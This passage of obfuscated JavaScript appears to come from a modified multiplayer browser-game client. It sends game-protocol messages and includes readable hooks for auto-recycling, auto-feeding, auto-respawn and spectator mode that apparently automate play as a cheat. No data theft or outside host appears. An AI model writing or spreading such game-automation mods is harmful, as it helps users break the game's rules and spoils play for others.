				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ΔⲆΔᐃᐃⲆⵠ].stringify([2, ΔᐃΔ.ⵠΔⵠⵠΔ, ΔᐃΔ.id]))
			};
			this.ᐃᐃⲆⵠΔΔⲆΔᐃ = function(ᐃΔ, ⵠΔΔⵠΔⵠⲆ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ᐃᐃᐃⵠⲆ].stringify([ⵠⵠⲆΔΔ, ᐃΔ, ⵠΔΔⵠΔⵠⲆ]))
			};
			this.ⲆᐃᐃᐃⲆᐃΔᐃΔ = function() {
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				if (ᐃⲆⲆ) {
					var ΔᐃᐃⵠⲆ = Math.PI * Ⲇᐃᐃⵠ;
					this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ΔⲆΔᐃᐃⲆⵠ].stringify([22, ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ, Math.floor(255 * ((ᐃⲆⲆ.angle + ΔᐃᐃⵠⲆ) % ΔᐃᐃⵠⲆ) / ΔᐃᐃⵠⲆ), ᐃᐃΔ.ⵠΔΔⲆ.mode]))
				}
			};
			this.ᐃΔⲆⲆΔ = function(ᐃΔ, ⵠᐃ) {
				switch (ᐃΔ) {
					case ᐃᐃ.ΔΔⵠⵠᐃ:
					case ᐃᐃ.ⵠⲆΔⲆⲆ:
					case ᐃᐃ.ⵠⲆᐃⲆⵠ:
					case ᐃᐃ.ⲆᐃⲆⲆⲆ:
					case ᐃᐃ.ΔⵠⲆⵠⵠ:
					case ᐃᐃ.ⵠⲆᐃᐃᐃ:
					case ᐃᐃ.ΔⵠⲆᐃᐃ:
					case ᐃᐃ.ⲆΔΔⲆᐃ:
					case ᐃᐃ.ᐃⵠⲆⲆΔ:
					case ᐃᐃ.ⲆΔⵠΔⲆ:
					case ᐃᐃ.ⲆⲆⵠΔΔ:
					case ᐃᐃ.ᐃⲆⲆᐃⵠ:
					case ᐃᐃ.ⵠᐃΔᐃΔ:
					case ᐃᐃ.ⵠⲆΔⲆΔ:
					case ᐃᐃ.ΔΔΔᐃⲆ:
					case ᐃᐃ.ⵠⵠᐃⲆᐃ:
					case ᐃᐃ.ⲆΔⵠΔⵠ:
					case ᐃᐃ.ᐃΔΔΔΔ:
					case ᐃᐃ.Ⲇⵠᐃᐃⵠ:
					case ᐃᐃ.ΔⵠⲆΔⵠ:
					case ᐃᐃ.ᐃΔΔΔⵠ:
					case ᐃᐃ.ⵠⲆⵠᐃⲆ:
					case ᐃᐃ.ΔᐃⲆⵠⲆ:
						ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = -1;
						this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⲆⲆΔᐃᐃᐃᐃ[ⵠᐃⲆΔⲆΔⲆ].stringify([34, ᐃΔ]));
						break;
					case ᐃᐃ.ᐃⲆⲆΔᐃ:
					case ᐃᐃ.ⵠⵠⵠΔⲆ:
					case ᐃᐃ.ⵠΔⵠᐃΔ:
					case ᐃᐃ.ⲆⵠⲆΔⲆ:
					case ᐃᐃ.ⵠⵠΔⲆⵠ:
					case ᐃᐃ.ⵠΔⲆᐃΔ:
					case ᐃᐃ.ΔᐃⲆᐃⵠ:
					case ᐃᐃ.ⵠⲆⲆⵠⲆ:
					case ᐃᐃ.ⵠⵠᐃⵠⲆ:
					case ᐃᐃ.ᐃΔⵠⵠⲆ:
					case ᐃᐃ.ΔᐃⲆⲆΔ:
					case ᐃᐃ.ⵠⲆΔᐃΔ:
					case ᐃᐃ.ⲆΔΔⵠᐃ:
					case ᐃᐃ.ΔⵠΔⲆⲆ:
					case ᐃᐃ.ⲆᐃᐃΔⲆ:
					case ᐃᐃ.ⲆΔⲆᐃᐃ:
					case ᐃᐃ.ⲆⵠⵠⵠⲆ:
					case ᐃᐃ.ⵠⵠⵠᐃⵠ:
					case ᐃᐃ.ⵠⵠᐃⲆⵠ:
					case ᐃᐃ.ΔᐃΔⲆᐃ:
					case ᐃᐃ.ⵠᐃᐃⵠᐃ:
					case ᐃᐃ.ⲆΔⵠΔΔ:
					case ᐃᐃ.ⵠᐃⵠⵠᐃ:
					case ᐃᐃ.ⵠⵠⵠᐃⲆ:
					case ᐃᐃ.ⲆⲆⲆⲆⲆ:
					case ᐃᐃ.ⵠⲆΔΔⵠ:
					case ᐃᐃ.ᐃᐃΔΔⲆ:
					case ᐃᐃ.ⲆⲆΔⵠⵠ:
					case ᐃᐃ.ⲆᐃΔΔⲆ:
					case ᐃᐃ.ⲆⵠⲆᐃᐃ:
					case ᐃᐃ.ⵠΔⵠᐃⲆ:
					case ᐃᐃ.ⵠⵠⲆΔⵠ:
					case ᐃᐃ.ⲆΔᐃΔᐃ:
					case ᐃᐃ.ⲆΔⲆⵠΔ:
					case ᐃᐃ.ⲆⲆΔⵠⲆ:
					case ᐃᐃ.ⵠΔⵠΔᐃ:
					case ᐃᐃ.ᐃΔᐃΔⵠ:
					case ᐃᐃ.ΔⲆⵠⵠᐃ:
					case ᐃᐃ.ΔᐃΔᐃⵠ:
					case ᐃᐃ.ⵠᐃⲆᐃⲆ:
					case ᐃᐃ.ΔⲆΔⲆᐃ:
					case ᐃᐃ.ⵠΔⲆᐃⵠ:
					case ᐃᐃ.ⵠᐃΔⲆⲆ:
					case ᐃᐃ.ΔΔⲆᐃᐃ:
					case ᐃᐃ.ᐃⵠᐃⲆⵠ:
					case ᐃᐃ.ⲆΔΔΔᐃ:
					case ᐃᐃ.ⵠⵠΔⵠⵠ:
					case ᐃᐃ.ᐃᐃΔⲆⲆ:
					case ᐃᐃ.ⵠᐃΔⲆᐃ:
					case ᐃᐃ.ⲆⲆⲆⲆΔ:
					case ᐃᐃ.ᐃⲆⲆⲆᐃ:
					case ᐃᐃ.ΔⲆᐃΔⵠ:
					case ᐃᐃ.ᐃⵠᐃⲆᐃ:
					case ᐃᐃ.ⲆⵠᐃⲆⵠ:
					case ᐃᐃ.ⲆΔᐃⲆᐃ:
					case ᐃᐃ.ⲆⵠΔΔⵠ:
						if (!ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
							ᐃΔ === ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ ? ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = -1 : ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = ᐃΔ
						}
						break;
					case ᐃᐃ.ⲆᐃⵠΔᐃ:
					case ᐃᐃ.ΔΔⵠᐃᐃ:
					case ᐃᐃ.ⵠᐃⲆⵠΔ:
					case ᐃᐃ.ᐃΔⵠᐃⵠ:
					case ᐃᐃ.ⵠⵠᐃⲆⲆ:
					case ᐃᐃ.ⲆⵠⵠᐃΔ:
					case ᐃᐃ.ⲆᐃⲆⲆΔ:
					case ᐃᐃ.ᐃⲆⲆᐃⲆ:
					case ᐃᐃ.ⵠⲆⵠⲆᐃ:
					case ᐃᐃ.ⵠᐃΔⲆⵠ:
					case ᐃᐃ.ᐃΔⲆᐃΔ:
					case ᐃᐃ.ᐃⲆⵠⲆⵠ:
					case ᐃᐃ.ᐃⵠΔⵠΔ:
					case ᐃᐃ.ⲆⲆᐃᐃΔ:
					case ᐃᐃ.ⵠΔΔⵠⵠ:
					case ᐃᐃ.ᐃᐃΔⵠᐃ:
					case ᐃᐃ.ⵠΔⲆⵠΔ:
					case ᐃᐃ.ΔⵠᐃⵠⲆ:
					case ᐃᐃ.ⲆⲆⵠΔⲆ:
					case ᐃᐃ.ΔⵠΔΔⲆ:
					case ᐃᐃ.ⵠⵠⲆΔⲆ:
					case ᐃᐃ.ΔᐃΔΔΔ:
					case ᐃᐃ.ⲆⲆΔᐃΔ:
					case ᐃᐃ.ΔⵠΔⲆΔΔΔⵠⵠ:
					case ᐃᐃ.ⲆⲆⵠᐃⵠ:
					case ᐃᐃ.ΔⲆⲆΔᐃ:
					case ᐃᐃ.ΔⵠⲆⲆᐃ:
					case ᐃᐃ.ᐃᐃΔⲆΔ:
					case ᐃᐃ.ⲆᐃⵠⵠΔ:
					case ᐃᐃ.ⲆΔΔⵠⵠ:
					case ᐃᐃ.ⵠΔⲆΔΔ:
					case ᐃᐃ.ⵠⲆᐃⵠᐃ:
					case ᐃᐃ.ΔΔⵠⵠⲆ:
					case ᐃᐃ.ΔⲆᐃⵠⲆ:
						if (!ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
							ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = -ᐃⲆᐃ;
							var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
							if (ᐃⲆⲆ && ᐃⲆⲆ.right === ᐃΔ) this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃᐃᐃⵠⲆ].stringify([34, ᐃᐃ.ᐃⲆᐃΔᐃ]));
							else {
								ᐃᐃΔ.ⲆᐃΔᐃΔ.wait = true;
								this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃΔΔΔⵠᐃᐃ[ⵠᐃΔⵠⵠΔΔ].stringify([34, ᐃΔ]))
							}
						}
						break;
					case ᐃᐃ.ⲆⵠᐃⵠΔ:
					case ᐃᐃ.ΔᐃⲆΔⲆ:
					case ᐃᐃ.ΔΔⲆⵠⲆ:
					case ᐃᐃ.ⵠⲆⲆΔⲆ:
					case ᐃᐃ.ΔⵠⲆΔⲆ:
					case ᐃᐃ.ⲆᐃⵠΔⲆ:
					case ᐃᐃ.ᐃᐃᐃⲆⵠ:
					case ᐃᐃ.ⵠⵠⲆⵠⲆ:
					case ᐃᐃ.ⲆⵠⵠⲆⵠ:
					case ᐃᐃ.ΔΔΔⵠΔ:
					case ᐃᐃ.ⵠⲆⵠΔᐃ:
					case ᐃᐃ.ⵠⲆᐃΔⲆ:
					case ᐃᐃ.ᐃⵠⵠⵠᐃ:
					case ᐃᐃ.ΔⵠⵠΔᐃ:
					case ᐃᐃ.ΔΔⲆⵠΔ:
					case ᐃᐃ.ⵠᐃΔΔᐃ:
					case ᐃᐃ.ⵠᐃᐃⲆΔ:
					case ᐃᐃ.ΔΔᐃⲆΔ:
					case ᐃᐃ.ΔΔⵠᐃⵠ:
					case ᐃᐃ.ᐃΔⲆᐃᐃ:
					case ᐃᐃ.ⵠΔᐃⵠΔ:
					case ᐃᐃ.ⲆⵠΔⲆⲆ:
					case ᐃᐃ.ⵠⲆⲆⵠⵠ:
					case ᐃᐃ.ⵠⲆⲆⲆΔ:
					case ᐃᐃ.ΔᐃⵠΔⲆ:
					case ᐃᐃ.ⲆΔⲆⵠⵠ:
					case ᐃᐃ.ⲆᐃⵠᐃⲆ:
					case ᐃᐃ.ⲆⵠⵠΔᐃ:
					case ᐃᐃ.ᐃᐃᐃⵠΔ:
						if (!ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
							ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = -ⵠΔΔ;
							var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
							ᐃⲆⲆ && ᐃⲆⲆ.right === ᐃΔ ? this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔΔⲆⵠⲆⵠᐃ[ⵠᐃⲆΔᐃᐃⵠ].stringify([34, ᐃᐃ.ᐃⲆᐃΔᐃ])) : this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⵠᐃⵠⵠⵠⵠ[ᐃⲆΔᐃⵠᐃⲆ].stringify([34, ᐃΔ]))
						}
						break;
					case ᐃᐃ.ⵠΔΔⲆⵠ:
					case ᐃᐃ.ᐃᐃΔΔⵠ:
					case ᐃᐃ.ⲆᐃⵠⵠⲆ:
					case ᐃᐃ.ⲆⵠᐃⵠⲆ:
					case ᐃᐃ.ᐃⵠᐃᐃΔ:
					case ᐃᐃ.ⵠⲆᐃⲆᐃ:
					case ᐃᐃ.ΔⵠⵠΔⲆ:
					case ᐃᐃ.ΔΔΔⲆⲆ:
					case ᐃᐃ.ΔᐃⲆΔᐃ:
					case ᐃᐃ.ⲆᐃᐃⵠⲆ:
						if (!ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
							ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = -1;
							var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
							this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⵠᐃⵠⵠⵠⵠ[ᐃⲆΔᐃⵠᐃⲆ].stringify([34, ᐃΔ]))
						}
						break;
					case ᐃᐃ.Ⲇⵠᐃⵠⵠ:
					case ᐃᐃ.ᐃΔⵠⲆⲆ:
					case ᐃᐃ.ΔᐃᐃΔΔ:
					case ᐃᐃ.ᐃⵠⵠⲆΔ:
					case ᐃᐃ.ⵠΔΔᐃⲆ:
					case ᐃᐃ.ⲆⵠⲆⵠΔ:
					case ᐃᐃ.ᐃΔⲆⲆⲆ:
					case ᐃᐃ.ⲆⵠΔⲆΔ:
					case ᐃᐃ.ⵠⵠⲆⲆᐃ:
					case ᐃᐃ.ᐃⵠᐃⲆⲆ:
					case ᐃᐃ.ᐃᐃΔΔΔ:
					case ᐃᐃ.ΔⵠⲆΔᐃ:
					case ᐃᐃ.ⵠᐃⲆⲆⵠ:
					case ᐃᐃ.ⵠⵠᐃⵠΔ:
					case ᐃᐃ.ⲆᐃⲆΔⵠ:
					case ᐃᐃ.ΔⲆⲆⲆⲆ:
					case ᐃᐃ.ΔⵠᐃΔⲆ:
						var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
						if (ᐃⲆⲆ && ᐃⲆⲆ.Ⲇⵠᐃᐃᐃ !== ᐃΔ) ᐃᐃΔ.ⲆⲆⵠⲆΔ.wait = true;
						this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⲆⲆΔᐃᐃᐃᐃ[ᐃᐃᐃⵠⲆ].stringify([34, ᐃΔ]));
						break;
					case ᐃᐃ.ΔⵠᐃⲆⵠ:
					case ᐃᐃ.ⲆⵠᐃΔΔ:
					case ᐃᐃ.ⲆⲆΔⲆᐃ:
					case ᐃᐃ.ᐃΔⲆᐃⲆ:
					case ᐃᐃ.ᐃᐃⲆⵠᐃ:
					case ᐃᐃ.ⲆⵠΔᐃⲆ:
					case ᐃᐃ.ΔᐃⲆⵠΔ:
					case ᐃᐃ.ⵠⲆⵠΔⵠ:
					case ᐃᐃ.ⲆⲆΔᐃᐃ:
					case ᐃᐃ.ⲆⲆⵠᐃᐃ:
					case ᐃᐃ.ΔⵠᐃⲆⲆ:
					case ᐃᐃ.ΔⲆΔⵠⵠ:
					case ᐃᐃ.ΔᐃᐃΔᐃ:
					case ᐃᐃ.ΔⵠⲆⵠΔ:
					case ᐃᐃ.ᐃⵠΔⲆᐃ:
					case ᐃᐃ.ᐃⲆΔΔⵠ:
						this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⵠⲆᐃᐃⵠΔ[ΔᐃΔᐃᐃΔⵠ].stringify([34, ᐃΔ]));
						break
				}
			};
			this.ΔΔⲆᐃᐃⵠᐃᐃⲆ = function(ᐃΔ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ⲆΔᐃⵠᐃᐃⵠ].stringify([31, ᐃΔ]))
			};
			this.ⵠΔⵠᐃΔΔᐃⵠΔ = function(ᐃΔ) {
				ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait = true;
				var ⵠᐃ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃΔ);
				ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⲆΔⲆΔⲆΔ(ᐃΔ, ⵠᐃ);
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ⲆΔᐃᐃΔΔⵠᐃᐃ = function(ᐃΔ, ⵠᐃ) {
				Settings.AutoRecycle.last = arguments[0];
				autoFeed();
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃΔΔⵠΔⵠ[ⵠᐃⲆΔᐃᐃⵠ].stringify([18, ᐃΔ]))
			};
			this.ΔⵠΔⵠⵠⲆⵠᐃⵠ = function(ᐃΔ, ⵠᐃ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔᐃⲆⲆⲆⲆᐃ[ΔⲆⵠΔᐃ].stringify([24, ᐃΔ]))
			};
			this.ⲆⵠᐃᐃΔⵠΔΔⵠ = function(ᐃΔ) {
				ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait = ᐃᐃⲆᐃᐃ;
				var ⵠᐃ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃΔ);
				ᐃᐃΔ.ⲆⵠⲆⵠ.ΔⵠⲆΔᐃⵠΔ(ᐃΔ, ᐃΔᐃⲆ, ⵠᐃ);
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ᐃᐃᐃⵠᐃΔⵠⵠⵠ = function(ΔⲆⵠΔ) {
				var ᐃΔ = ΔⲆⵠΔ[ΔᐃⲆⵠ];
				var ⲆΔⲆⲆ = ΔⲆⵠΔ[2];
				ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait = ᐃⲆⲆᐃΔ;
				var ⵠᐃ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃΔ);
				ᐃᐃΔ.ⲆⵠⲆⵠ.ΔⵠⲆΔᐃⵠΔ(ᐃΔ, ⲆΔⲆⲆ, ⵠᐃ);
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ᐃᐃᐃᐃⲆᐃᐃᐃⲆ = function() {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔᐃⲆⲆⲆⲆᐃ[ΔⲆⵠΔᐃ].stringify([ⵠᐃⵠⵠⲆ]))
			};
			this.ᐃⲆΔⵠⲆⵠⲆⵠⵠ = function(ⲆᐃΔ) {
				var ΔᐃᐃⵠⲆ = Math.PI * 2;
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ΔⲆΔᐃᐃⲆⵠ].stringify([36, Math.floor((ⲆᐃΔ + ΔᐃᐃⵠⲆ) % ΔᐃᐃⵠⲆ * ΔⵠᐃⵠΔ / ΔᐃᐃⵠⲆ)]))
			};
			this.ⲆⵠⲆΔⲆΔⲆᐃᐃ = function(ⲆᐃΔ) {
				var ΔᐃᐃⵠⲆ = ⵠΔⲆᐃ * Math.PI;
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ΔⲆΔᐃᐃⲆⵠ].stringify([ᐃⵠⲆ, Math.floor((ⲆᐃΔ + ΔᐃᐃⵠⲆ) % ΔᐃᐃⵠⲆ * ⵠᐃⲆᐃᐃⵠᐃ / ΔᐃᐃⵠⲆ)]))
			};
			this.ᐃⲆΔᐃᐃᐃᐃᐃᐃ = function(ΔⲆⵠⲆΔ) {
				Settings.Spectator.enabled || this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⵠⲆΔⲆⵠⲆ[ΔᐃΔΔΔⵠΔ].stringify([ᐃⵠΔⵠΔΔᐃ, ΔⲆⵠⲆΔ]))
			};
			this.ⲆᐃᐃᐃⲆⲆⲆᐃⵠ = function(ⲆⲆⵠΔᐃⲆⵠ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃᐃᐃⵠⲆ].stringify([33, ⲆⲆⵠΔᐃⲆⵠ]))
			};
			this.ⲆΔΔΔΔⵠⵠⵠΔ = function(ⲆⲆⵠΔᐃⲆⵠ) {
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				if (ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
					if (.5 < Math.random()) ᐃⲆⲆ.text.push(ⲆⲆⵠΔᐃⲆⵠ.substring(0, 25) + " ..." + ⲆⲆΔΔⲆ);
					else ᐃⲆⲆ.text.push(ⲆⲆΔΔⲆ + "... " + ⲆⲆⵠΔᐃⲆⵠ.substring(ᐃΔΔ, 25))
				} else ᐃⲆⲆ.text.push(ⲆⲆⵠΔᐃⲆⵠ);
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃᐃᐃⵠⲆ].stringify([ⵠⲆΔⲆᐃᐃⲆ, ⲆⲆⵠΔᐃⲆⵠ]))
			};
			this.ⲆⲆᐃᐃⵠ = function(ᐃⲆⲆ) {
				var ᐃᐃᐃΔ = ⵠΔⲆΔ.select.ΔⲆᐃ;
				if (ⵠⲆⲆ == ᐃᐃᐃΔ.length) return;
				var ΔⲆⵠΔ = [ⵠΔⲆⵠⲆⵠΔ];
				var ⲆⵠⲆΔⵠ = [];
				ΔΔⲆᐃ.ⲆⲆⵠᐃᐃⵠⵠ(ᐃⲆⲆ, {
					x: ⵠΔⲆΔ.ⲆΔΔ.rx,
					y: ⵠΔⲆΔ.ⲆΔΔ.ry
				});
				ΔⲆⵠΔ.push(ᐃⲆⲆ.x);
				ΔⲆⵠΔ.push(ᐃⲆⲆ.y);
				for (var ⵠᐃ = Ⲇᐃᐃᐃ; ᐃᐃᐃΔ.length > ⵠᐃ; ⵠᐃ++) ⲆⵠⲆΔⵠ.push(ᐃᐃᐃΔ[ⵠᐃ].ⵠⵠⲆⲆᐃⲆⵠⵠⲆ);
				ΔⲆⵠΔ.push(ⲆⵠⲆΔⵠ);
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃΔΔΔⵠᐃᐃ[ⵠᐃΔⵠⵠΔΔ].stringify(ΔⲆⵠΔ))
			};
			this.ⲆⲆⵠⵠⲆΔⲆ = ⲆΔⵠ;
			this.ΔᐃΔΔⲆΔΔ = {
				"ᐃⵠᐃⵠ": ΔᐃΔΔ,
				"ⵠᐃ": 0
			};
			this.ᐃΔΔΔΔΔᐃⲆΔ = function() {
				if (ᐃⲆⵠᐃᐃ.ⲆᐃᐃⵠᐃⲆᐃΔΔ < ᐃⲆⵠⵠΔ - this.ⲆⲆⵠⵠⲆΔⲆ) {
					this.ⲆⲆⵠⵠⲆΔⲆ = ᐃⲆⵠⵠΔ;
					var ⲆΔᐃⲆ = ᐃᐃΔ.ⲆΔΔ;
					var ⵠᐃ = Math.floor(ⲆΔᐃⲆ.x / 100);
					var ᐃⵠᐃⵠ = Math.floor(ⲆΔᐃⲆ.y / ΔᐃⵠⲆⲆ);
					if (ⵠᐃ != this.ΔᐃΔΔⲆΔΔ.ⵠᐃ || this.ΔᐃΔΔⲆΔΔ.ᐃⵠᐃⵠ != ᐃⵠᐃⵠ) {
						this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⵠᐃⵠⵠⵠⵠ[ⵠᐃⲆΔᐃᐃⵠ].stringify([28, Math.floor(-ⲆΔᐃⲆ.x), Math.floor(-ⲆΔᐃⲆ.y)]));
						this.ΔᐃΔΔⲆΔΔ.ⵠᐃ = ⵠᐃ;
						this.ΔᐃΔΔⲆΔΔ.ᐃⵠᐃⵠ = ᐃⵠᐃⵠ
					}
				}
			};
			this.ᐃⵠᐃᐃΔᐃΔ = 0;
			this.ⵠⵠⲆΔⵠⵠΔΔΔ = function() {
				ᐃⲆⵠᐃᐃ.ⲆⵠⲆⲆᐃᐃΔᐃΔ < ᐃⲆⵠⵠΔ - this.ᐃⵠᐃᐃΔᐃΔ && (this.ᐃⵠᐃᐃΔᐃΔ = ᐃⲆⵠⵠΔ, this.ping())
			};
			this.ᐃⲆⲆᐃΔᐃᐃⵠⲆ = function() {
				ᐃᐃΔ.reconnect.enabled = ΔᐃΔΔⵠ;
				if (ᐃᐃᐃ.ΔⲆⲆΔ.ΔⲆⲆᐃⲆ != ᐃᐃᐃ.ΔⲆⲆᐃⲆ) return;
				ᐃᐃᐃ.ΔⲆⲆᐃⲆ++;
				ᐃᐃᐃ.ΔⲆⲆΔ[ΔᐃⲆⵠⲆⵠΔ[87]]();
				ΔⵠⲆᐃ.connect()
			};
			this.ΔΔⵠᐃᐃⲆⵠᐃⲆ = function(ⲆⲆⲆⵠ) {
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ]);
				for (var ⵠᐃ = 1; ⲆⲆⲆⵠ.length > ⵠᐃ; ⵠᐃ++) ᐃᐃΔ.ⲆᐃⵠⲆΔ.push(ⲆⲆⲆⵠ[ⵠᐃ])
			};
			this.ΔΔⵠᐃΔⲆⵠᐃᐃ = function(ᐃΔ) {
				this.ⲆⲆⵠⲆⲆ(ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ + ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ]);
				ᐃᐃΔ.ⲆᐃⵠⲆΔ.push(ᐃΔ);
				var ⲆⲆᐃⵠⲆ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]);
				if (ΔⵠⵠⲆ.ΔΔⲆᐃⲆ != -1 && ⵠ[35] == ⲆⲆᐃⵠⲆ.style.display) ΔⵠⵠⲆ.ᐃΔⵠΔᐃ[ΔⵠⵠⲆ.ΔΔⲆᐃⲆ].action()
			};
			this.ⵠΔⲆΔⲆⲆΔΔᐃ = function() {
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ]);
				ᐃᐃΔ.ⵠΔΔᐃⵠ.wait = true;
				ᐃᐃΔ.ⲆᐃⵠⲆΔ = [];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]).style.display = ⵠ[465]
			};
			this.ΔΔᐃΔΔⵠΔΔᐃ = function(ᐃΔ) {
				if (ᐃΔ == ᐃᐃΔ.id) {
					this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ]);
					ᐃᐃΔ.ⵠΔΔᐃⵠ.wait = true;
					ᐃᐃΔ.ⲆᐃⵠⲆΔ = [];
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]).style.display = ⵠ[465]
				} else {
					this.ⲆⲆⵠⲆⲆ(ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ + ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ]);
					for (var ⵠᐃ = ᐃⵠΔ; ⵠᐃ < ᐃᐃΔ.ⲆᐃⵠⲆΔ.length; ⵠᐃ++) {
						if (ᐃΔ == ᐃᐃΔ.ⲆᐃⵠⲆΔ[ⵠᐃ]) {
							ᐃᐃΔ.ⲆᐃⵠⲆΔ.splice(ⵠᐃ, ΔⲆᐃᐃ);
							break
						}
					}
					var ⲆⲆᐃⵠⲆ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]); - 1 != ΔⵠⵠⲆ.ΔΔⲆᐃⲆ && ⵠ[35] == ⲆⲆᐃⵠⲆ.style.display && ΔⵠⵠⲆ.ᐃΔⵠΔᐃ[ΔⵠⵠⲆ.ΔΔⲆᐃⲆ].action()
				}
			};
			this.ⵠᐃΔΔⵠⲆΔⲆᐃ = function(ⲆⵠⵠΔ) {
				ᐃᐃΔ.ᐃⵠⵠΔΔ = false;
					if (!Settings.AutoRespawn.enabled && getUserProperty("alive") != true) {
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ]);
				}
				if (this.ΔⲆⲆᐃⲆ != this.ΔⲆⲆΔ.ΔⲆⲆᐃⲆ) return;
				this.ΔⲆⲆᐃⲆ++;
				ΔⵠⵠⲆ.ⵠΔΔΔᐃ(ⵠⲆᐃΔ.ⲆΔΔᐃⵠ);
				this.ΔⲆⲆΔ[ΔᐃⲆⵠⲆⵠΔ[87]]()
			};
			this.ⲆΔᐃΔⲆⲆΔᐃΔ = function(ⲆᐃΔᐃⲆΔⵠ, ΔⲆⵠΔ) {
				ᐃᐃΔ.ᐃⵠⵠΔΔ = ⲆΔⵠⲆΔ;
				var ⵠΔΔᐃᐃ = new Uint16Array(ΔⲆⵠΔ);
				var ⵠⵠᐃⵠⵠⲆᐃΔⵠ = new Uint32Array(ΔⲆⵠΔ);
				ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ⲆᐃΔᐃⲆΔⵠ = ᐃᐃΔᐃ[ⲆᐃΔᐃⲆΔⵠ][Math.floor(Math.random() * ᐃᐃΔᐃ[ⲆᐃΔᐃⲆΔⵠ].length)];
				ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ᐃⵠᐃⵠⵠ = ΔΔⲆᐃ.ⵠΔΔⲆⵠΔΔ(ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.id].ᐃⵠᐃⵠⵠ);
				ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ΔΔΔᐃⲆⲆᐃ = ΔΔⲆᐃ.ⵠΔΔⲆⵠΔΔ(ⵠⵠᐃⵠⵠⲆᐃΔⵠ[1]);
